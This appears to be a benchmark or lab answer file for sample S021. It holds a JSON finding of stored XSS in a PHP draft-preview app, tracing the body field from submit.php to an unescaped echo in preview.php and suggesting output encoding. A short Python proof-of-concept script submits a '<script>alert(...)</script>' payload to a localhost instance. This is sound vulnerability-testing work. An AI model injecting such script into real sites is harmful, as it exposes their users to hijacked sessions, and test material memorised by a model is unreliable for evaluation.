@@ -1,0 +1,101 @@
+```json
+{
+  "sample_id": "S021",
+  "prediction": "vulnerable",
+  "vulnerability_type": "XSS",
+  "locations": ["F01:0009", "F01:0010", "F01:0017", "F01:0019", "F01:0020", "F01:0028", "F03:0007", "F03:0015", "F03:0020", "F03:0039"],
+  "evidence": {
+    "source": "F01:0009 从 $_POST['body'] 取得原始字符串；F01:0010 仅做非空/长度检查。",
+    "flow": "写入请求：F01:0007 处理 POST，F01:0009 取 body，F01:0016-F01:0020 预处理并 INSERT 到 lab_preview_drafts，F01:0028 303 到 preview；持久化：F01:0017 表 lab_preview_drafts；独立读取/渲染请求：F03:0007 取 id，F03:0015-F03:0020 SELECT title,body，F03:0039 原样输出 body。",
+    "guard": "无效：F03:0038 对 title 使用 htmlspecialchars，F02:0029 对列表 title 转义，但 F03:0039 对 body 未编码/净化；F01:0010 仅做非空和长度限制。建议在 F03:0039 输出前按 HTML 正文上下文编码 body。",
+    "sink": "F03:0039 在 HTML 正文 div 中 echo $draft['body']，未转义。"
+  },
+  "prerequisites": [
+    "应用已按 runtime_context 运行，submit.php 和 preview.php 在 127.0.0.1:4280 可访问",
+    "无需登录",
+    "需用浏览器打开脚本输出的 preview URL 以确认 JavaScript 执行；响应体含字符串不视为执行"
+  ],
+  "missing_context": [
+    "未提供 db_connect.php 与数据库表结构的具体实现；但 F01/F03 原始行已显示 MySQLi 预处理绑定及读取路径",
+    "未提供 127.0.0.1:4280 下应用子目录；运行时需将 BASE_URL 配置为 submit.php 所在目录"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "运行：python3 s021_poc.py --base-url http://127.0.0.1:4280/ normal；再运行：python3 s021_poc.py --base-url http://127.0.0.1:4280/ test。普通输入为纯文本正文，测试输入为 <script>alert('S021-XSS')</script>。脚本提交后打印 preview URL；需人工用浏览器分别打开 normal 与 test 的 preview URL，确认 test 弹出提示框、normal 不弹出。HTTP 返回体出现字符串不等同于 JavaScript 执行。若应用在子目录，把 --base-url 改为 submit.php 所在目录（以 / 结尾）。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import argparse
+import sys
+import urllib.error
+import urllib.parse
+import urllib.request
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        return None
+
+def post_draft(base_url, title, body):
+    data = urllib.parse.urlencode({"title": title, "body": body}).encode("utf-8")
+    submit_url = urllib.parse.urljoin(base_url, "submit.php")
+    req = urllib.request.Request(submit_url, data=data, method="POST")
+    req.add_header("Content-Type", "application/x-www-form-urlencoded")
+    opener = urllib.request.build_opener(NoRedirect)
+    try:
+        resp = opener.open(req, timeout=10)
+        status = resp.status
+        location = resp.headers.get("Location")
+        resp.read()
+    except urllib.error.HTTPError as exc:
+        status = exc.code
+        location = exc.headers.get("Location")
+        exc.read()
+    if not location:
+        raise RuntimeError(f"POST submit.php 未返回 Location，HTTP {status}")
+    preview_url = urllib.parse.urljoin(base_url, location)
+    return status, preview_url
+
+def get_preview(url):
+    req = urllib.request.Request(url, method="GET")
+    with urllib.request.urlopen(req, timeout=10) as resp:
+        return resp.status, resp.read().decode("utf-8", "replace")
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        "--base-url",
+        default="http://127.0.0.1:4280/",
+        help="submit.php 所在目录 URL，需以 / 结尾",
+    )
+    parser.add_argument("mode", choices=["normal", "test"])
+    args = parser.parse_args()
+    base_url = args.base_url
+    if not base_url.endswith("/"):
+        base_url += "/"
+    if args.mode == "normal":
+        title = "S021 normal"
+        body = "S021 normal body - no script"
+        expected = "人工浏览器确认：不应弹出提示框"
+    else:
+        title = "S021 test"
+        body = "<script>alert('S021-XSS')</script>"
+        expected = "人工浏览器确认：应弹出 alert('S021-XSS')"
+    post_status, preview_url = post_draft(base_url, title, body)
+    get_status, html = get_preview(preview_url)
+    print(f"POST HTTP {post_status}")
+    print(f"preview_url: {preview_url}")
+    print(f"GET preview HTTP {get_status}")
+    print(f"响应体是否包含本次提交的 body 字符串: {body in html}")
+    print(expected)
+    print("注意：响应体包含字符串不等同于 JavaScript 执行。")
+    print("请用浏览器打开 preview_url 进行人工确认。")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except Exception as exc:
+        print(f"ERROR: {exc}", file=sys.stderr)
+        sys.exit(1)
+```
